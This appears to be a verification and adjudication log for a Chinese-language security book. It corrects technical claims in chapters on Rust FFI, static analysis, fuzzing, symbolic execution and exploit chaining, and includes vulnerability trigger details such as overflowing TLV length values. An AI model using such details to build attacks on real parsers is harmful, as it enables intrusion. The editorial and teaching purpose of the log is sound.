  - **verifier value**: 排除內聯、`-fno-plt` 經 GOT 間接呼叫與 `dlsym` 後，直接呼叫外部匯入函式通常經由 `.plt` 或 `.got`
  - **flagging families**: `codex:gpt-6.2-sol:low`
  - **arbiter**: `agrees=true conf=high` — 章內後文即有提及內聯與 `dlsym`，前文與自我檢核應排除內聯與間接呼叫以保持自洽。
  - **tiebreak**: `n/a`
  - **action**: 修正第 108 行與第 485 行，限定為未內聯的外部匯入函式直接呼叫點。

- **claim**: 「`movzx` 代表原始碼使用無號型別……`movsx` 與 `movsxd` 則明確揭露原始碼是 `int8_t`、`int16_t` 或 `int32_t`。」
  - **book value**: 擴充指令唯一決定原始碼宣告型別
  - **verifier value**: 擴充指令反映該次運算的無號／有號擴充語意，可能源於顯式轉型或整數提升，需結合條件分支與資料流推定候選型別
  - **flagging families**: `codex:gpt-6.2-sol:low`
  - **arbiter**: `agrees=true conf=high` — C 整數提升與顯式轉型亦會產生對應擴充指令，應表述為推斷有號／無號運算與候選型別的強力線索。
  - **tiebreak**: `n/a`
  - **action**: 修正第 137 行，精確化擴充指令與資料流型別推定的關係。

- **claim**: 「查出該函式庫可執行區段或檔案映射的起始基底位址……即可算出精準的執行期斷點位址。」
  - **book value**: 將「可執行區段起點」與「檔案映射起始基底位址」混為一談
  - **verifier value**: Ghidra RVA 以映像基底（檔案偏移 `0x0` 的首個 `PT_LOAD` 映射起點）為參照，不可直接加到檔案偏移非零的 `.text` 可執行區段起點上
  - **flagging families**: `codex:gpt-6.2-sol:low`
  - **arbiter**: `agrees=true conf=high` — 若取 `.text` 區段起點（例如檔案偏移 `+0x1000`）再加上 RVA `0x1446`，會重複加上 `0x1000`。
  - **tiebreak**: `n/a`
  - **action**: 修正第 247–248 行與第 487–488 行，明確指定取對應檔案偏移 `0x0` 的首個 `PT_LOAD` 映像起始基底位址。

- **bridging_review**:
  - **declared_bridge**: `"none"`
  - **detected_bridges**: `[]`（直接以第 20 章 ELF 區段與 System V ABI 切入）
  - **isomorphism_score**: `5`
  - **conversational_phrases**: `[]`
  - **verdict**: `pass`

---

## [2026-11-21] ch25-rust-unsafe-and-ffi.md — fixed

- **claim**: "`magic = 0x4e58 ('N','X')`，線路位元組為 `58 4e`。"
  - **book value**: `58 4e` 標示為 `('N','X')`
  - **verifier value**: 小端序數值 `0x4e58` 在記憶體／線路位元組為 `58 4e`，對應 ASCII `0x58 = 'X'`、`0x4e = 'N'`
  - **flagging families**: `codex:gpt-6.2-sol:low`
  - **arbiter**: `agrees=true conf=high` — `0x58` 為 `'X'`、`0x4e` 為 `'N'`，小端序位元組 `58 4e` 依序為 `'X','N'`。
  - **tiebreak**: `n/a`
  - **action**: 修正第 98 行與第 147 行，明確標示小端序位元組 `0x58='X', 0x4e='N'`，並修正第 100 行 `ptmalloc2` `malloc(0)` 最小 chunk 與語言契約說明。

- **claim**: "例如定義 `struct ValidatedTlvLen(u16)`（上限鎖死 `<= 65_536` 且通過邊界檢查才能建構）。"
  - **book value**: `struct ValidatedTlvLen(u16)`
  - **verifier value**: `u16::MAX` 為 `65,535`，無法容納基準合法上限 `65,536`，須使用 `u32` 或 `usize`
  - **flagging families**: `codex:gpt-6.2-sol:low`
  - **arbiter**: `agrees=true conf=high` — `65,536 = 2^16` 超出 `u16` 最大值 `65,535`。
  - **tiebreak**: `n/a`
  - **action**: 修正第 256 行，改為 `struct ValidatedTlvLen(u32)` 並加註 `65,536` 超出 `u16::MAX` 的位元寬度理由。

- **claim**: "呼叫 `unsafe` 函式或方法（包含所有 FFI 外部函式）。" 及 "Rust 2024 要求即使在 `unsafe fn` 內部，每一處不安全操作也必須顯式包進細粒度的 `unsafe { ... }` 區塊。"
  - **book value**: 「包含所有 FFI 外部函式」且將 `unsafe_op_in_unsafe_fn` 預設警告寫成硬性細粒度強制
  - **verifier value**: `unsafe extern` 區塊中未顯式標註為 `safe` 的外部函式才需 `unsafe` 呼叫；`unsafe_op_in_unsafe_fn` 在 Rust 2024 預設為警告，加上 `#![deny(unsafe_op_in_unsafe_fn)]` 才阻止編譯
  - **flagging families**: `codex:gpt-6.2-sol:low`
  - **arbiter**: `agrees=true conf=high` — 與同節後文描述的 `pub safe fn` 及 `unsafe_op_in_unsafe_fn` lint 等級對齊。
  - **tiebreak**: `n/a`
  - **action**: 修正第 37–63 行，同時補齊 `copy_tlv_payload` 的來源有效性與不重疊契約。

- **claim**: "任何型別只要進入「讀取未初始化位元組」的狀態，本身就是立即的 UB——哪怕你讀的是 `u8` 也一樣。"
  - **book value**: 未區分 `MaybeUninit<T>` 合法保存／搬移與具現化為需要已初始化的型別值
  - **verifier value**: 將未初始化位元組當作需要已初始化的有效型別值（如 `u8`、`bool`）讀取會造成立即 UB，`MaybeUninit<T>` 則可合法保存未初始化儲存
  - **flagging families**: `codex:gpt-6.2-sol:low`
  - **arbiter**: `agrees=true conf=high` — 精確區分 `MaybeUninit<T>` 與已初始化型別具現化，並同步修正 Stacked/Tree Borrows 與 LLVM `noalias` 敘述。
  - **tiebreak**: `n/a`
  - **action**: 修正第 72–85 行。

- **claim**: "在本地 `cargo test` 與 `cargo run`（Debug Profile）時，`a + b` 一旦溢位就會觸發 panic 並直接中止行程。"、"Rust 的 `as` 運算子在語意上是無條件截斷或重新解釋位元（lossy cast），永遠不會失敗。"、"只要經過 C ABI（`extern \"C\"`）或 Node.js N-API，Rust 的型別標籤、切片長度與分配器隔離資訊都會全部剝除。"
  - **book value**: Debug panic 直接中止行程、`as` 永遠是 lossy cast、經過 FFI 資訊全部剝除
  - **verifier value**: Debug 溢位觸發執行緒 panic（是否中止行程視 panic 策略與 FFI 邊界而定）；`as` 拓寬可保值，窄化或有號性切換才會截斷或重解讀；裸指標本身不帶切片長度與分配器資訊，須由 FFI 介面顯式傳遞
  - **flagging families**: `codex:gpt-6.2-sol:low`
  - **arbiter**: `agrees=true conf=high` — 三處文字精確化後更符合 Rust 語言與 ABI 規範。
  - **tiebreak**: `n/a`
  - **action**: 修正第 15 行、第 87–90 行與第 262 行。

- **claim**: "任何跨越 FFI 的 struct 都必須顯式加上 `#[repr(C)]`。" 及 "若 C 端回傳一個未被驗證的整數直接 `transmute` 或透過指標轉型成 Rust `bool` 或 `enum`（例如收到 `0x02`），Rust 在後續 `match` 分支最佳化時會假設「絕對只有這幾個值」並刪除安全分支，直接觸發 UB。"
  - **book value**: 未排除不透明指標（opaque pointer），且把無效 `bool`/`enum` 的 UB 發生時機寫成後續 `match` 時
  - **verifier value**: 需按值傳遞或兩端共同讀寫欄位的 struct 須加 `#[repr(C)]`（不透明指標目標可維持私有佈局）；產生無效 `bool`/`enum` 值的當下即直接觸發語言層級 UB
  - **flagging families**: `codex:gpt-6.2-sol:low`
  - **arbiter**: `agrees=true conf=high` — Rust Validity Invariant 規定產生非法 `bool`（如 `0x02`）當下即為立即 UB。
  - **tiebreak**: `n/a`
  - **action**: 修正第 199–205 行。

- **claim**: "分別比較 `cargo test`（Debug）與 `cargo test --release`（Release）的結果差異。"、"Miri 會立即攔截並輸出……（兩個 UB 放在同一個測試）"、"使用 `checked_add`、`try_into()` 與安全的切片邊界重構解析器"
  - **book value**: `parse_frame_safe` 使用 `as usize` 而非 `try_into()`；Debug 模式跳過 `parse_frame_vuln`；兩個 Miri UB 寫在同一個測試函式內（第一個中止後第二個不會執行）
  - **verifier value**: `parse_frame_safe` 改用 `try_into()`；新增 `#[cfg(debug_assertions)] #[should_panic]` 測試實際驗證 Debug 溢位 panic；將兩個 Miri UB 拆成兩個獨立測試函式 `test_miri_aliasing_ub` 與 `test_miri_uninit_ub`
  - **flagging families**: `codex:gpt-6.2-sol:low`
  - **arbiter**: `agrees=true conf=high` — 拆開測試並改用 `try_into()` 後，程式碼與實驗步驟完全一致且可獨立驗證。
  - **tiebreak**: `n/a`
  - **action**: 修正第 311 行、第 410–518 行。

- **bridging_review**:
  - **declared_bridge**: `"none"`（後三分之一 Ch25–Ch37 全面淡出）
  - **detected_bridges**: `[]`（純用資安與 Rust/FFI 原生詞彙）
  - **isomorphism_score**: `5`
  - **conversational_phrases**: `[]`
  - **verdict**: `pass`

---

## [2026-11-21] ch28-static-and-variant-analysis.md — fixed

- **claim**: 「到達 `buildOrderClause(input)` 時該條件並不成立。」及「`if (!ALLOWED.includes(field))` 裡沒有 `return` 或 `throw`，它的 `False` 分支（即 `ALLOWED.includes(field) == false`）執行完 `auditLog.warn` 後仍然會匯流回 `pool.query(...)`。」
  - **book value**: 到達呼叫時條件「並不成立」；將 `if (!ALLOWED.includes(field))` 在 `includes == false` 時的分支稱為 `if` 的 `False` 分支
  - **verifier value**: 兩條分支匯流後，到達呼叫時白名單條件「不一定成立」；當 `ALLOWED.includes(field)` 為 `false` 時，取反後的 `if (!...)` 條件為 `true`，故進入的是 `if` 的真分支
  - **flagging families**: `codex:gpt-6.2-sol:low`
  - **arbiter**: `agrees=true conf=high` — 布林取反後，`includes == false` 對應 `if` 條件為 `true`（真分支），匯流後條件未受支配（不一定成立）。
  - **tiebreak**: `n/a`
  - **action**: 修正第 84 行與第 766 行，同時在第 97 行釐清 SSA 無分支範例直接使用 `q_2`、匯流點才插入 `φ` 節點。

- **claim**: 「第一條抓 NestJS/Express 中常見的未驗證租戶邊界（BOLA，見第 6 章）或未參數化查詢。」及「第二條抓 `libnexus-parse` C FFI 解析器裡對 `8 bytes` TLV 檔頭 `len` 做加法溢位後才比對 `65,536 bytes` 上限的經典模式。」
  - **book value**: 正文前導文字將第一條 SQLi 規則說成兼抓 BOLA，將第二條長度污點規則說成只抓加法後比對
  - **verifier value**: 正文第一條 Semgrep 規則抓的是未淨化 HTTP 輸入流入原生 SQL 命令字串（BOLA 規則在「動手做」實作）；第二條規則追蹤未經 `> 65536` 上限守衛淨化便流入 `malloc`/`memcpy` 的外部 `hdr->len`
  - **flagging families**: `codex:gpt-6.2-sol:low`
  - **arbiter**: `agrees=true conf=high` — 讓前導文字與下方緊接的 YAML 規則語意完全吻合。
  - **tiebreak**: `n/a`
  - **action**: 修正第 121 行。

- **claim**: 「CodeQL 引擎……計算出每一條從 `Source`……抵達 `Sink`……的路徑，並透過 `PathGraph` 輸出完整逐行跳轉軌跡。」
  - **book value**: 「計算出每一條路徑」
  - **verifier value**: 遞迴不動點演算判斷分析模型中 `Source` 到 `Sink` 是否存在未受 `Barrier` 阻斷的可達污點關係，並提供用於解釋命中的流向軌跡
  - **flagging families**: `codex:gpt-6.2-sol:low`
  - **arbiter**: `agrees=true conf=high` — 含迴圈或多重分支的圖可能存在任意多條路徑，CodeQL 計算的是可達關係與代表路徑圖。
  - **tiebreak**: `n/a`
  - **action**: 修正第 198 行。

- **claim**: 「只消除了『語意上確定不可能造成字串結構逃逸』的路徑（參數陣列位置、整數轉型、白名單成員檢核）。」及「輸入經過 `parseInt(..., 10)` 或 `Number(...)` 強轉為數值（頂多變成 `NaN` 或整數，無法注入 SQL 關鍵字）。」
  - **book value**: `Number(...)` 頂多變成 `NaN` 或整數；`AllowlistGuard` 未說明接收者須為受控白名單常數
  - **verifier value**: `Number(...)` 可產生有限數值（含浮點數）、`Infinity` 或 `NaN`（無法夾帶引號或任意 SQL 語法，但業務範圍與整數性仍需驗證）；`AllowlistGuard` 在跨未知專案使用時需約束接收者為唯讀白名單常數
  - **flagging families**: `codex:gpt-6.2-sol:low`
  - **arbiter**: `agrees=true conf=high` — 補充 `Number(...)` 值域與 `AllowlistGuard` 接收者約束說明，並修正「動手做」`listSettlementsSafeParseInt` 中把 `req.user.tenantId` 字面插值的寫法為 `$1` 參數綁定。
  - **tiebreak**: `n/a`
  - **action**: 修正第 238 行、第 344 行與第 486 行。

- **claim**: 「同步提交一條高精度規則進 CI/CD，等於把一次性人工修復轉化為全組織永久生效的不變量檢查，阻斷同類漏洞在未來 PR 中回流。」及「改以 Rust 安全切片與 `checked_add`……將『長度溢位』從執行時期隱患收斂為型別系統與編譯期檢查的一部分。」及「NIST SARIF v2.1.0 規範」
  - **book value**: 過度絕對的「永久生效阻斷」；把執行期 `checked_add` 說成編譯期檢查；把 OASIS SARIF 標為 NIST
  - **verifier value**: 規則在其涵蓋範圍與持續執行的專案內攔截回歸樣態；`checked_add` 與安全切片在執行期檢查算術與範圍，並透過回傳型別（`Option`/`Result`）在編譯期強制呼叫端處理失敗；SARIF v2.1.0 為 OASIS 標準
  - **flagging families**: `codex:gpt-6.2-sol:low`
  - **arbiter**: `agrees=true conf=high` — 三處皆做精確化修正。
  - **tiebreak**: `n/a`
  - **action**: 修正第 30 行、第 404 行與第 802 行。

- **bridging_review**:
  - **declared_bridge**: `"none"`
  - **detected_bridges**: `[]`（純用靜態分析與資安領域原生詞彙）
  - **isomorphism_score**: `5`
  - **conversational_phrases**: `[]`
  - **verdict**: `pass`

---

## [2026-11-21] ch29-fuzzing-engineering.md — fixed

- **claim**: 「Sanitizers 在記憶體越界、UAF、未定義行為或未初始化讀取發生的當下立即中止行程並產出最小化 PoC。」、「Fuzzing……不驗證『合法輸入是否產生正確結果』。」、「區塊覆蓋率（Block Coverage）只記錄『某個函式是否執行過』。」
  - **book value**: 將 Sanitizer 診斷、行程中止與 PoC 最小化混為單一步驟；排除差分／屬性 Fuzzing；把函式覆蓋率誤寫為區塊覆蓋率
  - **verifier value**: Sanitizer（關閉錯誤恢復後）發出診斷並中止行程，Fuzzer 保存觸發輸入後再由縮減工具最小化；僅監測崩潰的傳統 Fuzzing 不驗證業務輸出，但結合斷言或差分測試即可驗證；记录函式是否執行的是函式覆蓋率（Function Coverage），區塊覆蓋率則記錄基本區塊（Basic Block）
  - **flagging families**: `codex:gpt-6.2-sol:low`
  - **arbiter**: `agrees=true conf=high` — 三處基本定義均精確修正。
  - **tiebreak**: `n/a`
  - **action**: 修正第 5 行、第 13 行與第 31 行。

- **claim**: 「若程式總邊緣數 E > 4,000，隨機雜湊必出現槽位覆蓋碰撞。」及「在 E <= 1,000 的小型解析器中，雖然出現『至少 1 次碰撞』的機率已達 99.95%，但實際損失的邊緣不到 8 條（0.76%）。」
  - **book value**: `E > 4,000` 寫成「必出現」碰撞；`E <= 1,000` 寫成碰撞率皆達 `99.95%` 且實際損失不到 8 條
  - **verifier value**: `E = 4,000 < 65,536` 時無碰撞機率約 `e^-122`（極高機率碰撞，唯 `E > 65,536` 才依鴿籠原理必然碰撞）；`99.95%` 與期望共槽 `7.58` 條（`0.76%`）是 `E = 1,000` 時的獨立均勻模型期望值
  - **flagging families**: `codex:gpt-6.2-sol:low`
  - **arbiter**: `agrees=true conf=high` — 區分鴿籠原理必然性與生日模型高機率／期望值，並補上「各邊緣 ID 彼此獨立且均勻隨機分布」前提。
  - **tiebreak**: `n/a`
  - **action**: 修正第 67 行與第 142–170 行。

- **claim**: 「Linux 核心必須建立新行程」是「傳統重新啟動（execve 模式）」中 execve 的作用，以及「Persistent Mode……就能徹底消滅 fork() 與系統呼叫開銷」並能跑滿 10,000 次「不致 OOM」。
  - **book value**: 將 `fork` 建立行程歸給 `execve`；稱 Persistent Mode「徹底消滅 `fork()` 與系統呼叫」及保證不致 OOM
  - **verifier value**: 傳統模式由 `fork()` 建立子行程再由 `execve()` 置換程式映像；Persistent Mode 每批（如 10,000 次）仍重新 `fork()` 一次，是將行程建立與 I/O 開銷攤薄萬倍，並限制單輪微小洩漏的跨輪累積
  - **flagging families**: `codex:gpt-6.2-sol:low`
  - **arbiter**: `agrees=true conf=high` — 修正系統呼叫分工與攤薄描述。
  - **tiebreak**: `n/a`
  - **action**: 修正第 83–113 行。

- **claim**: ASan 影子記憶體「在每一次記憶體讀取與寫入指令前」都檢查，隔離佇列則「確保任何 UAF 都會命中 0xfd 毒化區」；「必須加 -m none」；「整數回繞或有號溢位只印一行警告便繼續執行」，而「UBSAN_OPTIONS=abort_on_error=1」可單獨使可恢復的檢查終止；「afl-tmin……確保每次刪減後依然觸發相同 Crash。」
  - **book value**: 絕對化 ASan 隔離佇列對所有 UAF 的保證；未提 `halt_on_error=1` 與無號回繞需 `-fsanitize=unsigned-integer-overflow`；把 `afl-tmin` 保留崩潰退出訊號等同於保證相同根因
  - **verifier value**: ASan 檢查受插樁存取與攔截函式，有限容量的隔離佇列只能攔截尚未被移出重用的 UAF；UBSan 執行期終止需 `-fno-sanitize-recover=all` 或 `UBSAN_OPTIONS=halt_on_error=1:abort_on_error=1`（無號回繞非標準 C UB，需額外開啟 `unsigned-integer-overflow`）；`afl-tmin` 保留崩潰退出條件，縮減後應再核對 stack trace 確認根因未偏移
  - **flagging families**: `codex:gpt-6.2-sol:low`
  - **arbiter**: `agrees=true conf=high` — 逐項精確化 Sanitizer 與 `afl-tmin` 機制。
  - **tiebreak**: `n/a`
  - **action**: 修正第 187–206 行、第 284 行、第 303 行與第 633–638 行。

- **claim**: 「若 alloc_len <= 65536 則 malloc(alloc_len) 並拷貝實際封包殘餘位元組。」、「觸發缺陷 A 時檔案長度約 9–12 bytes，type=0x0002 且 len=0xf8ffffff 附近」、Rust Harness「序列化為合法 TLV 封包」並觸發「FFI 邊界 Crash」與「輸出最小化的 artifact 檔案」。
  - **book value**: 檢查點寫 `alloc_len <= 65536`（程式碼為 `65536 + 8`）；將小端序位元組 `f8 ff ff ff` 寫成十六進位數值 `0xf8ffffff`；Rust Harness 未限制 `payload.len() <= 65536` 且把 Safe Rust 切片 panic 寫成 FFI Crash 與自動最小化
  - **verifier value**: 檢查點對齊 `65536 + 8`（`65,544 bytes`）與 256-byte 拷貝上限；區分小端序檔案位元組 `f8 ff ff ff` 與解碼後無號整數 `0xfffffff8`；在 Rust Harness 中將序列化負載上限鎖定 `<= 65,536 bytes`，並精確描述為觸發切片邊界 panic（搭配 `cargo fuzz tmin` 縮減）
  - **flagging families**: `codex:gpt-6.2-sol:low`
  - **arbiter**: `agrees=true conf=high` — 全數對齊程式碼與位元組序。
  - **tiebreak**: `n/a`
  - **action**: 修正第 327 行、第 339 行、第 501 行與第 583–605 行。

- **bridging_review**:
  - **declared_bridge**: `"none"`
  - **detected_bridges**: `[]`（純用 Fuzzing 與二進位安全原生詞彙）
  - **isomorphism_score**: `5`
  - **conversational_phrases**: `[]`
  - **verdict**: `pass`

---

## [2026-11-21] ch30-symbolic-execution-and-hybrid-fuzzing.md — fixed

- **claim**: "只要修改任何一個位元組，校驗和就會立即失效。" 及 "凡是觸發 Crash 的輸入都是 100% 真陽性。" 及 "Concolic 的關鍵優勢在於「永遠不會因為找不到環境狀態而卡死」。"
  - **book value**: 未限定為「受校驗保護的欄位位元組」；將 Crash 直接等同 100% 目標漏洞真陽性；絕對化 Concolic 永遠不會卡死
  - **verifier value**: 修改受校驗算式涵蓋的檔頭與核心負載欄位位元組會使校驗和失效（尾端 `extra` 位元組未納入算式）；Crash 代表真實可重現的執行期異常（排除 Harness 或環境設定問題後即確認為目標缺陷）；Concolic 在具體執行能正常跑完時，可藉由具體化（concretization）跨過缺乏符號模型的外部函式
  - **flagging families**: `codex:gpt-6.2-sol:low`
  - **arbiter**: `agrees=true conf=high` — 三處語意收斂至嚴密表述。
  - **tiebreak**: `n/a`
  - **action**: 修正第 5 行、第 16 行與第 60 行。

- **claim**: "均勻隨機期望嘗試次數（50% 機率命中）：2^31 = 2,147,483,648 次。"、"由 C3 ∧ C4 → 選取合法最小邊界低 16 位元 0xFFF9。"、"0x0001FFF9 × 0x9E3779B1 = 0x00013C6C_9FDDAC29。"
  - **book value**: 將無放回隨機排列平均次數 `2^31`（50% 候選空間）與有放回隨機抽樣期望次數（`2^32`）混寫；稱 `0xFFF9` 為最小合法低 16 位元（實際 `0xFFF8..0xFFFB` 皆滿足 `< 4`，`0xFFF9` 對應最小正配置尺寸 `1 byte`）；64 位元完整乘積高 32 位元誤寫為 `0x00013C6C`
  - **verifier value**: 明確區分「無放回完整枚舉最壞／有放回抽樣期望 `2^32` 次（`9.94 天`）」、「無放回隨機排列平均 `2^31` 次（`4.97 天`）」與「有放回累積命中率 50% 之 `ln(2) × 2^32` 次（`6.89 天`）」，並寫出三欄位獨立均勻抽樣聯合機率 `(1 × 4 × 1) / 2^96 = 2^-94 < 2^-80`；註明合法低 16 位元為 `0xFFF8..0xFFFB`（選取讓回繞後等於 `1` 的 `0xFFF9`）；修正完整 64 位元乘積為 `0x0001FFF9 × 0x9E3779B1 = 0x00013C6A_9FDDAC29`（低 32 位元 `0x9FDDAC29` 與 `csum = 0xEEB5AD7C` 完全不變）
  - **flagging families**: `codex:gpt-6.2-sol:low`
  - **arbiter**: `agrees=true conf=high` — 驗算 `0x0001FFF9 * 0x9E3779B1 = 131065 * 2654435761 = 347898612935465 = 0x00013C6A_9FDDAC29`，低 32 位元仍為 `0x9FDDAC29`。
  - **tiebreak**: `n/a`
  - **action**: 修正第 94–137 行。

- **claim**: "依照 libnexus-parse 規格加入 state.solver.add(sym_len <= 65536)。" 及 "Concolic Execution 只在單一具體執行路徑上保留 32 個線性分支點並逐一嘗試反轉，記憶體僅維持 O(32) 級別。"
  - **book value**: 在 Claripy/Z3 位元向量上直接用有號 `<=` 限制無號長度 `sym_len`；將單路徑分支紀錄 `O(k)` 直接簡寫為總記憶體 `O(32)`
  - **verifier value**: 位元向量無號上限約束應使用 `claripy.ULE(sym_len, 65536)`（避免最高位元為 1 的超大無號長度在有號比較下被當成負數放行）；明確說明單次具體執行的線性分支條件紀錄為 `O(k)`（`k = 32`），連同單路徑符號狀態遠小於 `O(2^k)` 狀態樹
  - **flagging families**: `codex:gpt-6.2-sol:low`
  - **arbiter**: `agrees=true conf=high` — 與本章強調的 `ULT`/`ULE` 無號位元向量比較規則完全一致。
  - **tiebreak**: `n/a`
  - **action**: 修正第 252 行與第 512 行。

- **bridging_review**:
  - **declared_bridge**: `"none"`
  - **detected_bridges**: `[]`（純用符號執行、SMT 與二進位安全原生詞彙）
  - **isomorphism_score**: `5`
  - **conversational_phrases**: `[]`
  - **verdict**: `pass`


<!-- source: verify-log-slice-6.md -->
# P4 Adjudication & Bridging Review Log — slice-6 (`ch31`, `ch32`, `ch34`, `ch36`, `ch37`)

## Bridging Review Summary (Fade-out Tier: Final Third `ch25–ch37`, Declared Bridge: `"none"`)

| Chapter | Declared Bridge | Detected Bridges | Isomorphism Score | Conversational / Everyday Analogies | Verdict | Notes |
|---|---|---|---|---|---|---|
| `ch31-real-world-oss-fuzzing.md` | `none` | none | 5 (exempt) | none | `pass` | Pure domain vocabulary (SanitizerCoverage, ASan, `FuzzedDataProvider`, `llvm-cov`, Stack Hash, OSS-Fuzz/ClusterFuzzLite). |
| `ch32-chaining-ai-and-0day-workflow.md` | `none` | none | 5 (exempt) | none | `pass` | Pure security domain terms (Capability Dependency Graph, Source-to-Sink, deterministic kill-switch, Hub Node). |
| `ch34-appsec-engineering-and-sdlc.md` | `none` | none | 5 (exempt) | none | `pass` | Replaced colloquial "打地鼠式修補" with domain term "單點被動修補與反覆回歸（Reactive Patching & Regression）"; zero everyday analogies. |
| `ch36-security-career-and-interviews.md` | `none` | none | 5 (exempt) | none | `pass` | Pure security engineering, threat modeling, and career assessment terminology. |
| `ch37-certifications-and-proof-of-work.md` | `none` | none | 5 (exempt) | none | `pass` | Pure security certification, signal-theory, and Proof-of-Work evaluation terminology. |

---

## Adjudication Log Entries

## [2026-11-21] ch31-real-world-oss-fuzzing.md — fixed
claim: 只要其中任何一個第三方 JSON、壓縮或 TLS 解析套件沒經過持續模糊測試驗證，供應商程式碼就會變成整個服務最脆弱的信任破口；「沒有已知 CVE」往往只代表「還沒有人把模糊測試引擎接上去」；只要被挖出一個堆積越界寫入或 UAF，攻擊者就能利用同一份 PoC 同時攻擊成千上萬套未修補的線上服務。
book value: Over-absolute causal assertions equating absence of fuzzing/CVEs or single memory bugs with universal exploitability across all downstream deployments.  verifier value: Qualify by input reachability, configuration, and verification gap.  flagging families: codex:gpt-6.2-sol:low
arbiter: agrees=true conf=high — Missing continuous fuzzing indicates a verification gap on reachable parsing surfaces, not automatically the single most vulnerable point or identical exploitability across every downstream deployment.
tiebreak: n/a
action: Qualified statements in intro, `## 從你已知的出發`, and `### 攻擊者目標與實質影響` to bound claims by untrusted input reachability, configuration, and verification gaps.

## [2026-11-21] ch31-real-world-oss-fuzzing.md — fixed
claim: 建置隔離與靜態鏈結：把外部函式庫的動態相依（`.so` / `.dylib`）改造成全靜態插樁二進位檔；`-fsanitize=fuzzer-no-link`——這個旗標只插入 SanitizerCoverage 邊緣探針與 Sanitizer 檢查，不連結 `main()`；過重環境初始化會讓吞吐量跌破 `10 exec/s`。
book value: Stated static linking alone adds probes and attributed ASan/UBSan checks to `-fsanitize=fuzzer-no-link`.  verifier value: Target libraries must be recompiled from source with instrumentation and statically linked; `-fsanitize=fuzzer-no-link` adds fuzzing coverage instrumentation without linking the fuzzer engine `main()`, while ASan/UBSan are enabled by their respective flags; `10 exec/s` corresponds to an example 100 ms per-iteration initialization cost.  flagging families: codex:gpt-6.2-sol:low
arbiter: agrees=true conf=high — Relinking an uninstrumented binary statically does not add probes; `-fsanitize=fuzzer-no-link` only provides fuzzer coverage/cmp instrumentation without `main()`.
tiebreak: n/a
action: Clarified source recompilation with instrumentation + static archive linking, separated `-fsanitize=fuzzer-no-link` from `-fsanitize=address,undefined`, and added the explicit 100 ms per-execution calculation for `10 exec/s`.

## [2026-11-21] ch31-real-world-oss-fuzzing.md — fixed
claim: 由於 `FuzzedDataProvider` 遵循一致的消費順序（部分整數從緩衝區尾端切取、變長字串從前端切取），模糊器的覆蓋率引導突變依然能穩定保留有效參數前綴；若 Harness 解析成功後就直接 `free()` 結束，整條序列化與邊界檢查路徑覆蓋率永遠是 `0%`。
book value: Claimed `FuzzedDataProvider` guarantees unchanging parameter prefixes across mutations and that all boundary-check coverage is 0% without serialization calls.  verifier value: `FuzzedDataProvider` consumes integrals from the tail and remaining bytes from the front deterministically per input; omitting write calls leaves write-exclusive code paths at 0% coverage.  flagging families: codex:gpt-6.2-sol:low
arbiter: agrees=true conf=high — `ConsumeIntegral` pulls from the tail of the buffer in LLVM's implementation, which also conflicted with the lab text saying flags were taken from the front.
tiebreak: n/a
action: Aligned prose and lab description with LLVM `FuzzedDataProvider` tail-integral / front-payload consumption semantics and scoped `0%` coverage to serializer-exclusive code paths.

## [2026-11-21] ch31-real-world-oss-fuzzing.md — fixed
claim: libFuzzer 傳給 Harness 的 `const uint8_t *data` 是一個緊密貼合 `size` 邊界的獨立分配區塊（後方緊鄰 ASan 紅區 Redzone），哪怕只多讀 1 byte 就會立刻被 ASan 攔截；真正的資源耗盡漏洞必須是「極小輸入（如幾 KB）就能觸發級數級記憶體暴增或無限迴圈」；20 exec/s 下每次配置與釋放就消耗數百毫秒。
book value: Over-stated unconditional 1-byte ASan interception, required exponential memory growth or infinite loops for DoS, and paired 20 exec/s (50 ms average) with hundreds of milliseconds on every execution.  verifier value: ASan interception requires instrumented code reading past `[data, data+size)` into the heap redzone; quadratic time/CPU amplification within allowed input bounds also constitutes DoS; 20 exec/s equals 50 ms average per execution (with multi-hundred-ms spikes on large inputs).  flagging families: codex:gpt-6.2-sol:low
arbiter: agrees=true conf=high — 20 exec/s is 50 ms/exec on average; quadratic parsing is already cited earlier in the chapter as a valid DoS vector.
tiebreak: n/a
action: Refined ASan redzone condition to instrumented code, included quadratic amplification in DoS criteria, and reconciled `20 exec/s` (`50 ms` average) with large-sample latency spikes.

## [2026-11-21] ch31-real-world-oss-fuzzing.md — fixed
claim: 動手做與自我檢核：`git clone` 未鎖定 `0.10.0` tag；`corpus_p2` 未寫入小型合法種子步驟；正文稱呼叫 `yyjson_val_write` 但程式碼呼叫 `yyjson_write_opts`；`harness/` 與 `.clusterfuzzlite/build.sh` 的 `fuzz/` 路徑不一致；字典插入變異幾毫秒 100% 穿透分支；`afl-tmin` 或 `-runs=1` 收斂多輸入狀態序列。
book value: Unpinned `git clone`, missing seed creation command, `yyjson_val_write` name mismatch, `harness/` vs `fuzz/` path mismatch in ClusterFuzzLite script, and imprecise sequence-minimization instructions.  verifier value: Pin `--branch 0.10.0`, create `corpus_p2/seed0.bin`, match `yyjson_write_opts` / `yyjson_doc_mut_copy` / `yyjson_mut_write_opts`, align `harness/` paths in `build.sh` and `cflite_pr.yml`, and describe sequence recording + binary-search prefix reduction for cross-iteration state pollution.  flagging families: codex:gpt-6.2-sol:low
arbiter: agrees=true conf=high — All six items in the lab and self-check solutions were genuine consistency defects.
tiebreak: n/a
action: Added `--branch 0.10.0`, added `printf ... > corpus_p2/seed0.bin`, updated function names to `yyjson_write_opts`, aligned `harness/` paths across `build.sh` and `cflite_pr.yml`, and fixed Self-Check #2 and #4 explanations.

## [2026-11-21] ch32-chaining-ai-and-0day-workflow.md — fixed
claim: 若缺乏利用鏈思維，這四份各自不起眼的發現會被丟進低優先級待辦清單；兩段原語必須共用同一個連線生命週期、同一個會話或可重複觸及的目標端點；這條路徑上的所有低危節點在風險評估上就會同步鎖定為最高終點等級。
book value: Counted 4 findings where 3 were listed; required shared connection/session/endpoint universally for context continuity; claimed every low-severity node's standalone rating is locked to the chain's terminal severity.  verifier value: 3 findings listed in that paragraph; context continuity requires prior output/state to remain valid in the next step's required execution context; remediation priority targets the validated chain while individual node base scores remain distinct.  flagging families: codex:gpt-6.2-sol:low
arbiter: agrees=true conf=high — Paragraph 3 listed 3 items (hostname leak, blind internal forwarding, unauthenticated internal API), and info-leak chaining across endpoints does not require sharing the same TCP connection or session.
tiebreak: n/a
action: Corrected "這四份" to "這三項", generalized Context Continuity and Temporal Window Compatibility rules, and distinguished whole-chain remediation priority from individual node CVSS ratings.

## [2026-11-21] ch32-chaining-ai-and-0day-workflow.md — fixed
